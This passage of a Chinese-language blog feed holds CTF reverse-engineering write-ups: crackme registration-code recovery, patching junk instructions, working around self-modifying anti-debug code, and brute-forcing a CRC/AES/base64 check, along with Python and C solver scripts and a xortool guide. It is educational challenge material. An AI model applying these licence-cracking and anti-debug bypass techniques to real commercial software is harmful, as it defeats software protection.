00403B3D    0800            OR BYTE PTR DS:[EAX],AL
00403B3F    0000            ADD BYTE PTR DS:[EAX],AL
00403B41    58              POP EAX
//花指令 EB 01 B7 F9 72 01 86 NOP掉

00403B35    90              NOP
00403B36    90              NOP
00403B37    90              NOP
00403B38    90              NOP
00403B39    90              NOP
00403B3A    90              NOP
00403B3B    90              NOP
00403B3C    E9 08000000     JMP crackme_.00403B49                                      ; 脱离注册码验证循环体
00403B41    58              POP EAX
//去花指令之后
</code></pre><p>综上所述：14位连接一起就是注册码，因此注册码为”codebywidesoft”。</p>
]]></content>
      <tags>
        <tag>writeup</tag>
        <tag>reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>reverse之第六更</title>
    <url>/2017/01/24/reverse%E4%B9%8B%E7%AC%AC%E5%85%AD%E6%9B%B4/</url>
    <content><![CDATA[<p>本题同样也涉及到反调试技术，题目提供一个exe和一个dll，用IDA分析程序：<br><a id="more"></a></p>
<p><img src="http://p1.bpimg.com/567571/70a93b006a742471.png" alt=""></p>
<p>loc_402000是验证flag是否正确的函数，点开一看。。。一脸懵逼</p>
<p><img src="http://p1.bqimg.com/567571/b0ab23cb23308271.png" alt=""></p>
<p>应该是SMC，所谓SMC就是相当于把某些重要函数在二进制文件中进行加密，这些函数在程序执行的时候会动态解密。然而OD中会出现反调试。</p>
<p>接下来运行程序，然后将之debugger attach到IDA上，加密数据段就解密了，不过可能是我的IDA的问题，这个过程十分漫长。。。。。。。</p>
<p>加载完成之后</p>
<p><img src="http://p1.bpimg.com/567571/e2027be2a13e885b.png" alt=""></p>
<p>在loc_402000位置创建一下函数，F5反编译。发现这个函数首先为得到re1DLL.dll的Trololololololol数组，然后不断将用户输入与Trololololololol数组中的某些元素进行比较，前面一些比较指令相对比较简单，得到了flag的前半部分ISCC{N3v3r_7r4apped_6y_4nt!_XXXXX}<br>最后的XXXXX是通过re1DLL.dll的Derpaherp函数进行set的</p>
<p> <img src="http://i1.piimg.com/567571/c77f2dcf766c9a0c.png" alt=""></p>
<p>Derpaherp是有三个参数的，这里只有一个是IDA F5的锅，调到汇编仍然可以看到调用Derpaherp之前push了三个参数，最后会有一个strcmp，v13和unk_405048比较，我把unk_405048导出来发现其为ad42f6697b035b7580e4fef93be20b4d，是Md5，拖入cmd5.com跑了一下，跑出来是debug。由此也可以断定Derpaherp内部其实是实现了Md5计算，所以最后的flag为ISCC{N3v3r_7r4apped_6y_4nt!_debug}</p>
]]></content>
      <tags>
        <tag>writeup</tag>
        <tag>reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>reverse之第十更</title>
    <url>/2017/02/05/reverse%E4%B9%8B%E7%AC%AC%E5%8D%81%E6%9B%B4/</url>
    <content><![CDATA[<p>一道比较复杂的算法Crack，主要考查CRC校验算法，AES加密，以及base64加密算法。<br><a id="more"></a><br>程序运行之后发现提示内容是Try angin！但是搜索字符串并没有，但是看到一个很像base64的字符串，过去发现各种算法以及调用，在函数开头下断，果然加密算法都在这个地方。</p>
<p>在IDA中分析该函数</p>
<pre><code>char __thiscall sub_401880(int this)
{
  int v1; // ebx@1
  char v2; // al@1
  char v3; // dh@1
  char v4; // ch@1
  char v5; // ah@1
  char v6; // dl@1
  char v7; // cl@1
  unsigned int v8; // esi@7
  unsigned int v9; // eax@7
  char *v10; // ecx@7
  char result; // al@8
  unsigned int v12; // esi@10
  wchar_t *v13; // edi@11
  unsigned int v14; // ecx@13
  unsigned int v15; // kr18_4@13
  unsigned int v16; // kr1C_4@14
  CHAR *v17; // ecx@18
  char v18; // [sp+4h] [bp-1F8h]@1
  char v19; // [sp+5h] [bp-1F7h]@1
  char v20; // [sp+6h] [bp-1F6h]@1
  char v21; // [sp+7h] [bp-1F5h]@1
  char v22; // [sp+8h] [bp-1F4h]@1
  char v23; // [sp+9h] [bp-1F3h]@1
  char v24; // [sp+Ah] [bp-1F2h]@1
  char v25; // [sp+Bh] [bp-1F1h]@1
  char v26[200]; // [sp+Ch] [bp-1F0h]@13
  char v27[132]; // [sp+D4h] [bp-128h]@10
  __int128 v28; // [sp+158h] [bp-A4h]@13
  __int128 v29; // [sp+168h] [bp-94h]@13
  __int64 v30; // [sp+178h] [bp-84h]@13
  int v31; // [sp+180h] [bp-7Ch]@13
  char v32; // [sp+184h] [bp-78h]@13
  char Dst; // [sp+185h] [bp-77h]@13
  CHAR v34; // [sp+1BCh] [bp-40h]@7
  int v35; // [sp+1D0h] [bp-2Ch]@10
  int v36; // [sp+1D4h] [bp-28h]@10
  int v37; // [sp+1D8h] [bp-24h]@10
  int v38; // [sp+1DCh] [bp-20h]@10
  CHAR v39[4]; // [sp+1E0h] [bp-1Ch]@1
  int v40; // [sp+1E4h] [bp-18h]@1
  __int16 v41; // [sp+1E8h] [bp-14h]@1
  CHAR MultiByteStr[4]; // [sp+1ECh] [bp-10h]@1
  int v43; // [sp+1F0h] [bp-Ch]@1
  int v44; // [sp+1F4h] [bp-8h]@1

  v1 = this;
  *(_DWORD *)v39 = 0x20756F59;
  v40 = &apos;!niW&apos;;
  v41 = &apos;\0&apos;;
  *(_DWORD *)MultiByteStr = &apos; yrT&apos;;
  v2 = *(_BYTE *)this;
  v3 = *(_BYTE *)(this + 1);
  v4 = *(_BYTE *)(this + 2);
  v5 = *(_BYTE *)(v1 + 3);
  v6 = *(_BYTE *)(v1 + 4);
  v7 = *(_BYTE *)(v1 + 5);
  v18 = v2;
  v43 = &apos;iaga&apos;;
  v44 = &apos;!n&apos;;
  v19 = v3;
  v20 = v4;
  v21 = 0;
  v22 = v5;
  v23 = v6;
  v24 = v7;
  v25 = 0;
  if ( (unsigned __int8)(v2 - 65) &gt; 0x19u
    || (unsigned __int8)(v3 - 65) &gt; 0x19u
    || (unsigned __int8)(v4 - 65) &gt; 0x19u
    || (unsigned __int8)(v5 - 65) &gt; 0x19u
    || (unsigned __int8)(v6 - 65) &gt; 0x19u
    || (unsigned __int8)(v7 - 65) &gt; 0x19u )
  {
    result = sub_4016D0(MultiByteStr);
  }
  else
  {
    v8 = CRC((int)&amp;v18, strlen(&amp;v18));
    v9 = CRC((int)&amp;v22, strlen(&amp;v22));
    sub_401490(&amp;WideCharStr, 30, L&quot;%08x%08x&quot;, v8, v9);
    sub_401840(&amp;WideCharStr, &amp;v34);
    sub_4016D0(MultiByteStr);
    v10 = (char *)v1;
    do
      result = *v10++;
    while ( result );
    if ( !(((_BYTE)v10 - ((_BYTE)v1 + 1)) &amp; 0xF) )
    {
      v35 = 0x1020304;
      v36 = 0x7080900;
      v37 = 0xE0F0506;
      v38 = 0xA0B0C0D;
      sub_401380((_BYTE *)v1, (int)v27, strlen((const char *)v1), (int)&amp;v34, (int)&amp;v35);
      v12 = 0;
      if ( strlen((const char *)v1) )
      {
        v13 = &amp;WideCharStr;
        do
        {
          sub_401490(v13, 3, L&quot;%02x&quot;, (unsigned __int8)v27[v12++]);
          v13 += 2;
        }
        while ( v12 &lt; strlen((const char *)v1) );
      }
      sub_401840(&amp;WideCharStr, v27);
      sub_401570(strlen(v27), (int)v27, v26);
      v31 = &apos;=X7V&apos;;
      _mm_storeu_si128((__m128i *)&amp;v28, _mm_loadu_si128((const __m128i *)&amp;xmmword_4034F4));
      v32 = 0;
      _mm_storeu_si128((__m128i *)&amp;v29, _mm_loadu_si128((const __m128i *)&amp;xmmword_403504));
      _mm_storel_epi64((__m128i *)&amp;v30, _mm_loadl_epi64((const __m128i *)&amp;qword_403514));
      memset(&amp;Dst, 0, 0x37u);
      v14 = 0;
      v15 = strlen((const char *)&amp;v28);
      if ( v15 )
      {
        v16 = strlen(v26);
        while ( v14 &lt; v16 )
        {
          if ( *((_BYTE *)&amp;v28 + v14) != v26[v14] )
          {
            v17 = MultiByteStr;
            goto LABEL_19;
          }
          if ( ++v14 &gt;= v15 )
            break;
        }
      }
      v17 = v39;
LABEL_19:
      result = sub_4016D0(v17);
    }
  }
  return result;
}
</code></pre><p>首先发现，成功和失败的提示被定义为字符串保存在函数中，程序运行之后才会出现。程序的大致流程是先将输入的前六位取出，判断是不是大写字母，如果不是就失败。</p>
<p>之后将前六位分成两组，求其CRC32的校验码，CRC的算法如下：</p>
<pre><code>uint crc32( uchar *buf, int len)
{
    uint ret = 0xFFFFFFFF;
    int   i;
    if( !init )
    {
         init_table();
         init = 1;
    }
    for(i = 0; i &lt; len;i++)
    {
         ret = CRC32[((ret &amp; 0xFF) ^ buf[i])] ^ (ret &gt;&gt; 8);
    }
     ret = ~ret;
    return ret;
}
</code></pre><p>CRC算法求解关键在于CRC表的生成，一般都是动态生成的，也可以静态定义，不过很麻烦。第一次求CRC初始的ret是-1，之后的ret就是上一次所求的CRC，以此原理将两部分的CRC转换为8位的16进制连接起来作为下面AES加密的密钥。</p>
<p>加密之后的结果转换为16进制字符串，进行base64编码，与程序给出的XQXgWk5yLADiXx6hVQCAKxTjVQXiWxPhXASCKALhV7X=比较，base64转换过程中的置换表与平常的有些区别</p>
<pre><code>0987654321ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba+/
</code></pre><p>最终求正确的注册码必须要枚举密钥，反解AES然后比较解密结果的前六位与密钥是否一致，脚本如下：</p>
<pre><code># _*_ coding:utf-8 _*_

from Crypto.Cipher import AES
import string
from zlib import crc32

def crack():
    atable=&apos;0987654321ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba+/&apos;
    btable=&apos;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&apos;
    base=&apos;XQXgWk5yLADiXx6hVQCAKxTjVQXiWxPhXASCKALhV7X=&apos;
    transtab=string.maketrans(atable,btable)
    iv=&apos;\x04\x03\x02\x01\x00\x09\x08\x07\x06\x05\x0f\x0e\x0d\x0c\x0b\x0a&apos;
    table=list(string.uppercase)
    c=base.translate(transtab).decode(&apos;base64&apos;).decode(&apos;hex&apos;)
    count=0
    for i1 in table:
        for i2 in table:
            for i3 in table:
                for i4 in table:
                    for i5 in table:
                        for i6 in table:
                            key=&apos;%08x&apos;%(crc32(i1+i2+i3)&amp;0xffffffff)+&apos;%08x&apos;%(crc32(i4+i5+i6)&amp;0xffffffff)
                            crypto=AES.new(key,AES.MODE_CBC,iv)
                            m=crypto.decrypt(c)
                            count+=1
                            if count%5000000==0:
                                print count
                            if m[:6]==i1+i2+i3+i4+i5+i6:
                                print &apos;flag:&apos;+m
                                return
if __name__==&apos;__main__&apos;:
    crack()
</code></pre>]]></content>
      <tags>
        <tag>writeup</tag>
        <tag>reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>reverse之第四更</title>
    <url>/2017/01/20/reverse%E4%B9%8B%E7%AC%AC%E5%9B%9B%E6%9B%B4/</url>
    <content><![CDATA[<p>首先读取文件的头四个字节判断是否是0x33465443，不是提示“你打开的不是.ctf加密文件”。<br><a id="more"></a></p>
<p><img src="http://p1.bqimg.com/567571/a39714c92cd59c03.png" alt=""></p>
<p>再接着读取了0x10个字节。它用来验证输入的密码是否正确。然后读取了4个字节，它决定了解密数据部分的长度。最后就是根据这个数据长度读取指定的字节数。</p>
<p><img src="http://p1.bpimg.com/567571/fbd00866b10d1c81.png" alt=""></p>
<p>整个加密文件有0x61C9个字节。所以真正的数据部分长度不会超过这个大小。观察加密文件头部，很容易找到数据部分的长度。</p>
<p><img src="http://p1.bqimg.com/567571/d161617008852e03.png" alt=""></p>
<p>整个文件0x619C个字节都是加密数据，前面的是头部。</p>
<p>接下来就是解密，输入的密钥经过md5加密得到的16字节作为密钥对数据进行异或，每异或16字节，密钥就自增1，数据段里有部分数据是如下：</p>
<p><img src="http://i1.piimg.com/567571/9eba76040404226a.png" alt=""><br>规律很明显，由此可以推断这一部分对应的明文是0x00,数据是从43 C9 FD开始加密，很容易推出加密的密钥是0x13,0x82,0xFE,0x47,0xe4,0xb9,0x8e,0xd8,0x68,0xfc,0xa1,0xd5,0x4a,0x4f,0x36,0x2</p>
<p>解密脚本如下:</p>
<pre><code>a=&apos;17 86 02 4B E8 BD 92 DC 6C 00 A5 D9 4E 53 3A 06&apos;
aList=a.split(&apos; &apos;)
oriList=[]
for i in aList:
    oriList.append((int(i,16)-4)&amp;0xff)
print(oriList)
f=open(&apos;1.ctf&apos;,&apos;rb&apos;)
ctfdata=f.read()
f.close()

f=open(&apos;encrypt.ctf&apos;,&apos;wb&apos;)
validData=ctfdata[0x2d:]
for i in range(0,len(validData)):
    data=int(validData[i].encode(&apos;hex&apos;),16)
    tmp=data^oriList[i%16]
    f.write(chr(tmp))
    oriList[i%16]+=1
    oriList[i%16]=oriList[i%16]&amp;0xff
f.close()
</code></pre>]]></content>
      <tags>
        <tag>writeup</tag>
        <tag>reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>reverse第二更之问鼎杯2106-6-2</title>
    <url>/2016/12/05/reverse%E7%AC%AC%E4%BA%8C%E6%9B%B4%E4%B9%8B%E9%97%AE%E9%BC%8E%E6%9D%AF2106-6-2/</url>
    <content><![CDATA[<p>题目提供了一个exe程序和一个文本readme.txt，txt内容如下：<br><a id="more"></a></p>
<pre><code>问题描述：
name:
serial:78767-77666-76786-87788-77778-66867-66777-86767-66877-77778-88887

根据序列号求name。name就是正确的flag

Hint:
name一共12位，
name[0]=&apos;{&apos;,name[1]=&apos;h&apos;,name[2]=&apos;d&apos;,name[3]=&apos;u&apos;
name[5]=&apos;b&apos;,name[9]=&apos;0&apos;,name[10]=&apos;_&apos;,name[11]=&apos;}&apos;
其他位的范围为26个小写字母和下划线
暴力循环6min多点（64位i5六代cpu，python）
</code></pre><p>很明显就是个通过name计算serial的算法，name应该是{hdu?b???0_}，我们可以通过已知的serial逆推name。用OD调试程序：</p>
<p><img src="http://p1.bpimg.com/567571/5063259205174ddf.png" alt=""></p>
<p>我们输入name=’{hdu4b3210_}’h和已知的serial，name保存到了[local16],serial保存到[local10]。</p>
<p><img src="http://p1.bpimg.com/567571/dd58b26005ea8906.png" alt=""></p>
<p>IDA和OD结合分析找到关键的函数应该是002D2080</p>
<p><img src="http://p1.bpimg.com/567571/9bf1aace82d28c45.png" alt=""><br>在002D2080函数里找到上述语句，为函数002D1F30传递参数，再次跟进002D1F30</p>
<p><img src="http://i1.piimg.com/567571/6c1f52b94c8d4f9e.png" alt=""><br>将前两位进行运算然后加起来的值7存入[local3],之后的每一位都是一样的道理,最后把五位serial码赋值到eax+0x4</p>
<p><img src="http://p1.bpimg.com/567571/b263abf1ac2a8d48.png" alt=""></p>
<p><img src="http://p1.bqimg.com/567571/b3024a62d0d9470d.png" alt=""></p>
<p>name一共12位，serial一共11个部分，每两位求出一部分，过程如下:</p>
<pre><code> 2void decode(int forward, int back, int re[]){ 
 3     int i;
 4     int local1, local2, local3, local4, local5 = 0;//, eax, ecx, ebx;
 5     int result[5] = {0};
 6     printf(&quot;%c %c &quot;, (char)forward, (char)back);
 7     //temp = (forward &amp; 1) + 6; // forward % 2 + 6;
 8     //temp1 = (back &gt;&gt; 2 ) &amp; 1; // back / 4 % 2
 9     //local3为第一位
10     // forward % 2+6+back / 4 % 2
11     local3 = (forward &amp; 1) + 6 + ((back &gt;&gt; 2 ) &amp; 1);
12     result[0] = local3;
13     //local4为第二位
14     //ecx = ((forward &gt;&gt; 3)&amp; 1)+6;// &gt;&gt; 3 == / 8; &amp; 1 == % 2
15     //eax = (back &gt;&gt; 3) &amp; 1;
16     //forward / 8 % 2 + 6 + back / 8 % 2;
17     local4 = ((forward &gt;&gt; 3)&amp; 1)+6+((back &gt;&gt; 3) &amp; 1);
18     result[1] = local4;
19     //local1为第三位
20     // forward / 2 % 2 + 6 + back / 8 % 2;
21     local1 = ((forward &gt;&gt; 1) &amp; 1)+6 + ((back &gt;&gt; 4) &amp; 1);
22     result[2] = local1;
23     //第4位在ecx即local2中
24     local2 = (back &amp; 1 )+6+((forward&gt;&gt;2)&amp;1);
25     result[3] = local2;
26     //第5位在ebx中
27     local5 = ((back &gt;&gt; 1) &amp; 1)+6+((forward &gt;&gt; 4) &amp; 1);
28     result[4] = local5;
29     printf(&quot;%d%d%d%d%d  &quot;, result[0], result[1], result[2], result[3], result[4]);
30     for(i = 0; i &lt; 5; i++){ 
31         re[i] = result[i];
32     }
33     //return result;
34 }
</code></pre>]]></content>
      <tags>
        <tag>writeup</tag>
        <tag>reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>xortool的安装使用</title>
    <url>/2016/10/05/xortool%E7%9A%84%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p>Xortool.py是一款基于python的脚本，用来完成一些xor分析。<br><a id="more"></a></p>
<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><ul>
<li>猜想key的长度</li>
<li>猜想key的值</li>
<li><p>解密一些经过xoe加密的文件</p>
<h2 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h2><p>xortool依赖于python的命令行参数解释器docopt。</p>
<p>  $ sudo pip install docopt<br>Then install xortool:</p>
<p>  $ cd /data/src/<br>  $ git clone <a href="https://github.com/hellman/xortool.git" target="_blank" rel="external">https://github.com/hellman/xortool.git</a><br>  $ cd xortool/<br>  $ sudo python setup.py install</p>
<h2 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h2></li>
</ul>
<h3 id="Options"><a href="#Options" class="headerlink" title="Options"></a>Options</h3><pre><code>-l,--key-length
    length of the key (integer)
-c,--char
    most possible char (one char or hex code)
-m,--max-keylen=32
    maximum key length to probe (integer)
-x,--hex
    input is hex-encoded str
-b,--brute-chars
    brute force all possible characters
-o,--brute-printable
    same as -b but will only use printable characters for keys
</code></pre><h2 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h2><p>详细功能参见<br><img src="https://www.aldeid.com/wiki/Xortool" alt="官方说明"><br>这里和大家分享一个解密文件的功能，在xortool里有一个名为xortool-xor的文件，它可以将xor加密的文件解密。</p>
<p>有一个加密的文件为flag.encrypted,异或加密的密钥是dc647eb65e6711e155375218212b3964，</p>
<p><img src="http://i1.piimg.com/567571/6931a5b710e21777.png" alt=""></p>
<p>这样就解密了。。。</p>
]]></content>
      <tags>
        <tag>ctf</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>信大校赛</title>
    <url>/2017/01/15/%E4%BF%A1%E5%A4%A7%E6%A0%A1%E8%B5%9B/</url>
    <content><![CDATA[<p>参加信大校赛题目记录<br><a id="more"></a></p>
<h1 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h1><p>题目比较简单，使用反编译工具查看java代码如下：</p>
<pre><code>import android.content.Context;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.EditText;
import android.widget.Toast;

class a
  implements View.OnClickListener
{
  a(MainActivity paramMainActivity, EditText paramEditText, Context paramContext) {}

  public void onClick(View paramView)
  {
    if (this.a.getText().toString().equals(String.format(&quot;flag{%s}&quot;, new Object[] { MainActivity.m.substring(12, 24) })))
    {
      Toast.makeText(this.b, &quot;You are right!&quot;, 1).show();
      return;
    }
    Toast.makeText(this.b, &quot;You are wrong!&quot;, 1).show();
  }
}
</code></pre><p>程序的主要算法流程是将<br>gUID<em>P@Rt}T10n</em>$C#3m3Gu]d_par7|t)On<em>SCH3M3<br>这个字符串经过substring(12, 24)变化之后得到新的字符串，substring() 方法用于提取字符串中介于两个指定下标之间的字符，也就是说将下标12到下标20之间的字符串提取出来，结果是0n</em>$C#3m3Gu]。</p>
<h1 id="warmup-re"><a href="#warmup-re" class="headerlink" title="warmup-re"></a>warmup-re</h1><p>拖到IDA里看一下伪代码：</p>
<pre><code>// local variable allocation has failed, the output may be wrong!
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // rax@1
  __int64 v4; // rdx@1
  __int64 v5; // rax@1
  __int64 v6; // rbx@1
  __int64 v7; // rdx@1
  __int64 v8; // rax@1
  __int64 v9; // rdx@1
  __int64 v10; // rax@2
  __int64 v11; // rdx@2
  int result; // eax@2
  __int64 v13; // rax@5
  __int64 v14; // rdx@5
  unsigned __int64 v15; // rbx@7
  unsigned __int64 v16; // rax@7
  __int64 v17; // rax@8
  __int64 v18; // rdx@8
  char v19[48]; // [sp+20h] [bp-60h]@1
  char v20[48]; // [sp+50h] [bp-30h]@1
  char v21[48]; // [sp+80h] [bp+0h]@4
  int v22; // [sp+B0h] [bp+30h]@1
  int v23; // [sp+B4h] [bp+34h]@1
  int v24; // [sp+B8h] [bp+38h]@1
  int v25; // [sp+BCh] [bp+3Ch]@1
  int v26; // [sp+C0h] [bp+40h]@1
  int v27; // [sp+C4h] [bp+44h]@1
  int v28; // [sp+C8h] [bp+48h]@1
  int v29; // [sp+CCh] [bp+4Ch]@1
  int v30; // [sp+D0h] [bp+50h]@1
  int v31; // [sp+D4h] [bp+54h]@1
  int v32; // [sp+D8h] [bp+58h]@1
  int v33; // [sp+DCh] [bp+5Ch]@1
  int v34; // [sp+E0h] [bp+60h]@1
  int v35; // [sp+E4h] [bp+64h]@1
  int v36; // [sp+E8h] [bp+68h]@1
  int v37; // [sp+ECh] [bp+6Ch]@1
  int v38; // [sp+F0h] [bp+70h]@1
  int v39; // [sp+F4h] [bp+74h]@1
  int v40; // [sp+F8h] [bp+78h]@1
  int v41; // [sp+FCh] [bp+7Ch]@1
  int v42; // [sp+100h] [bp+80h]@1
  char v43; // [sp+10Ah] [bp+8Ah]@4
  char v44; // [sp+10Bh] [bp+8Bh]@4
  int i; // [sp+10Ch] [bp+8Ch]@3

  _main();
  v22 = 86;
  v23 = 30;
  v24 = 24;
  v25 = 1;
  v26 = 21;
  v27 = 90;
  v28 = 27;
  v29 = 29;
  v30 = 6;
  v31 = 29;
  v32 = 76;
  v33 = 84;
  v34 = 22;
  v35 = 20;
  v36 = 85;
  v37 = 28;
  v38 = 22;
  v39 = 21;
  v40 = 30;
  v41 = 29;
  v42 = 23;
  LODWORD(v3) = std::operator&gt;&gt;&lt;char,std::char_traits&lt;char&gt;&gt;(*(_QWORD *)&amp;argc, argv, v19, refptr__ZSt3cin);
  std::operator&gt;&gt;&lt;char,std::char_traits&lt;char&gt;&gt;(*(_QWORD *)&amp;argc, argv, v20, v3);
  LODWORD(v5) = strlen(*(_QWORD *)&amp;argc, argv, v4, v19);
  v6 = v5;
  LODWORD(v8) = strlen(*(_QWORD *)&amp;argc, argv, v7, v20);
  if ( v6 == v8 )
  {
    for ( i = 0; ; ++i )
    {
      v15 = i;
      LODWORD(v16) = strlen(*(_QWORD *)&amp;argc, argv, v9, v19);
      if ( v15 &gt;= v16 )
        break;
      v44 = v19[i];
      v43 = v20[i];
      v21[i] = v43 ^ v44;
      v9 = (unsigned int)v21[i];
      if ( (_DWORD)v9 != *(&amp;v22 + i) )
      {
        LODWORD(v13) = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(*(_QWORD *)&amp;argc, argv, &quot;key error&quot;, refptr__ZSt4cout);
        std::ostream::operator&lt;&lt;(
          *(_QWORD *)&amp;argc,
          argv,
          refptr__ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_,
          v13);
        system(*(_QWORD *)&amp;argc, argv, v14, &quot;pause&quot;);
        return 0;
      }
    }
    LODWORD(v17) = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(
                     *(_QWORD *)&amp;argc,
                     argv,
                     &quot;Yes!input is flag&quot;,
                     refptr__ZSt4cout);
    std::ostream::operator&lt;&lt;(
      *(_QWORD *)&amp;argc,
      argv,
      refptr__ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_,
      v17);
    system(*(_QWORD *)&amp;argc, argv, v18, &quot;pause&quot;);
    result = 0;
  }
  else
  {
    LODWORD(v10) = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(*(_QWORD *)&amp;argc, argv, &quot;lenth error&quot;, refptr__ZSt4cout);
    std::ostream::operator&lt;&lt;(
      *(_QWORD *)&amp;argc,
      argv,
      refptr__ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_,
      v10);
    system(*(_QWORD *)&amp;argc, argv, v11, &quot;pause&quot;);
    result = 0;
  }
  return result;
}
</code></pre><p>程序的意思就是输入两个长度相等的字符串之后进行异或运算，将运算结果和程序给出的v22的数组中的内容比较，提示给出其中一个字符串是goodgoodstudydaydayup，解密脚本如下：</p>
<pre><code>v1=[86,30,24,1,21,90,27,29,6,29,76,84,22,20,85,28,22,21,30,29,23]
v2=[103,111,111,100,103,111,111,100,115,116,117,100,121,100,97,121,100,97,121,117,112]
flag=[]
for i in xrange(0,21):
    flag+=chr(list(v1)[i]^list(v2)[i])
print(flag)
</code></pre><p>结果是</p>
<pre><code>[&apos;1&apos;, &apos;q&apos;, &apos;w&apos;, &apos;e&apos;, &apos;r&apos;, &apos;5&apos;, &apos;t&apos;, &apos;y&apos;, &apos;u&apos;, &apos;i&apos;, &apos;9&apos;, &apos;0&apos;, &apos;o&apos;, &apos;p&apos;, &apos;4&apos;, &apos;e&apos;, &apos;r&apos;, &apos;t&apos;, &apos;g&apos;, &apos;h&apos;, &apos;g&apos;]
</code></pre><h1 id="reverse1"><a href="#reverse1" class="headerlink" title="reverse1"></a>reverse1</h1><p>使用IDA分析，关键函数是encrypt()</p>
<pre><code>       v19 = 0;
  LODWORD(v16) = std::string::operator[](a2, 0LL);
  while ( *v16 )
  {
    LODWORD(v2) = std::string::operator[](a2, v19);
    v3 = *v2;
    LODWORD(v4) = std::vector&lt;int,std::allocator&lt;int&gt;&gt;::operator[](&amp;primos, v19);
    v18 = v3 + *v4;
    LODWORD(v5) = std::string::operator[](a2, v19);
    if ( (unsigned __int8)is_lower(*v5) )
    {
      v6 = 122;
    }
    else
    {
      LODWORD(v7) = std::string::operator[](a2, v19);
      if ( (unsigned __int8)is_upper(*v7) )
      {
        v6 = 90;
      }
      else
      {
        LODWORD(v8) = std::string::operator[](a2, v19);
        v6 = *v8;
      }
    }
    while ( v18 &gt; v6 )
      v18 -= 26;
    LODWORD(v9) = std::string::operator[](a2, v19);
    v10 = v9;
    LODWORD(v11) = std::string::operator[](a2, v19);
    if ( *v11 == 123 )
    {
      v14 = 125;
    }
    else
    {
      LODWORD(v12) = std::string::operator[](a2, v19);
      if ( *v12 == 125 )
      {
        v14 = 123;
      }
      else
      {
        LODWORD(v13) = std::string::operator[](a2, v19);
        if ( (unsigned __int8)is_alphabet(*v13) )
        {
          v14 = v18;
        }
        else
        {
          LODWORD(v15) = std::string::operator[](a2, v19);
          v14 = *v15;
        }
      }
    }
    *v10 = v14;
    LODWORD(v16) = std::string::operator[](a2, ++v19);
  }
  std::string::string(a1, a2);
  return a1;
}
</code></pre><p>查找字符串还找到了个flag</p>
<pre><code>LNLNGW}o3A3g5Z_1b_Xv5d_WbzgGnbG{
</code></pre><p>程序流程是将你输入的正确的flag，每一位加上prime[]相应位置的值，如果是{}的话，{换成｝，｝换成｛。如果是字母，判断大小写运算后是否超出范围，如果超出范围就减去26直到符合大小写范围为止，然后逆推算法就可以了。比较麻烦的是prime[]是什么，程序里还有一个initial()</p>
<pre><code>  for ( i = 2; i &lt;= 1023; ++i )
    ehprimo[(signed __int64)i] = (i &amp; 1) != 0;
  for ( j = 3; ; j += 2 )
  {
    result = j;
    if ( (signed int)j &gt; 1023 )
      break;
    if ( ehprimo[(signed __int64)(signed int)j] )
    {
      std::vector&lt;int,std::allocator&lt;int&gt;&gt;::push_back(&amp;primos, &amp;j);
      for ( k = j * j; (signed int)k &lt;= 1023; k += j )
        ehprimo[(signed __int64)(signed int)k] = 0;
    }
  }
  return result;
}
</code></pre><p>这个函数是求0~1024之间的素数，不包括2作为prime[]的数据。</p>
<p>最后逆推出来flag为IIECTF{r3V3r5E_1s_Ea5y_DeadBeeF}</p>
<h1 id="CrackMe"><a href="#CrackMe" class="headerlink" title="CrackMe"></a>CrackMe</h1><p>IDA反编译发现想要获得flag需要通过4个check函数：</p>
<p>第一个cheack</p>
<pre><code>signed int check1(void)
{
  signed int v1; // [sp+10h] [bp-8h]@7

  puts(&quot;Give me your favourite prime number&quot;);
  scanf(&quot;%lld&quot;, &amp;n);
  a = 0x100000LL;
  b = 0LL;
  c = 0LL;
  while ( !(a &amp; 1) )
  {
    a /= 2LL;
    ++b;
  }
  while ( !(b &amp; 1) )
  {
    b /= 2LL;
    ++c;
  }
  if ( c == n )
  {
    flag += n;
    v1 = 1;
  }
  else
  {
    puts(&quot;^^^^Your math is bad^^^^&quot;);
    v1 = 0;
  }
  return v1;
}
</code></pre><p>python跑出来符合条件的数是2</p>
<pre><code>a=1048576
b=0
c=0
var=a&amp;1
while var==0:
    a=a/2
    var=a&amp;1
    b=b+1
print(b)
vbr=b&amp;1
while vbr==0:
    b=b/2
    vbr=b&amp;1
    c=c+1
print(c)
</code></pre><p>chack2</p>
<pre><code>signed int check2(void)
{
  signed int v1; // [sp+24h] [bp-14h]@10
  __int64 v2; // [sp+28h] [bp-10h]@1

  puts(&quot;Do you know how to calculate the number&quot;);
  puts(&quot;please enter a number&quot;);
  scanf(&quot;%lld&quot;, &amp;n);
  v2 = n;
  if ( tmpans != n * tmp % mod || n &gt; 999999 )
    goto LABEL_15;
  while ( n )
  {
    x[++pos] = n % 10;
    n /= 10LL;
  }
  if ( dword_448044 &gt;= dword_448048
    || dword_448048 &gt;= dword_44804C
    || dword_44804C &gt;= dword_448050
    || dword_448050 &gt;= dword_448054
    || dword_448054 &gt;= dword_448058 )
  {
LABEL_15:
    puts(&quot;You do not know how to calculate the mod~~~~&quot;);
    v1 = 0;
  }
  else
  {
    flag += v2;
    v1 = 1;
  }
  return v1;
}
</code></pre><p>python代码得出符合条件的数是654321</p>
